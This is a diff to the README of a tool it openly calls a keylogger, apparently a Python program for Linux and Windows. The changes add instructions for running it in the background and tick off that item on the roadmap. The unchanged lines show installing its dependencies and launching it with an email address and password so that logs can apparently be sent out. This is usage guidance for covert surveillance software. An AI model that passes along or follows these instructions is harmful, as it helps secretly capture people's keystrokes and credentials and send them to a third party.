@@ -24,6 +24,9 @@ pip install pyscreenshot pyxhook && sudo apt install python-xlib
 ## How i use it on Windows?
 >./keylogger.exe -e "example@exemple.com" -p "example1234" --local C:/anyware/Desktop/logs.txt
 
+## How to let the program running on background ?
+**this is a simple just run the program with & or on the end**
+
 ## Syntax 
 ```
  --password is your password of your email
@@ -44,7 +47,7 @@ distributed under license GNU GENERAL PUBLIC LICENSE version 3 by [Free Software
  - [x] Windows Version 
  - [ ] Add UAC on Windows Version  
  - [x] Arguments and make a binare of the program 
- - [ ] Make the program run in the background
+ - [x] Make the program run in the background
  - [x] Add the Pyinstaller 
 
 ### Contributing
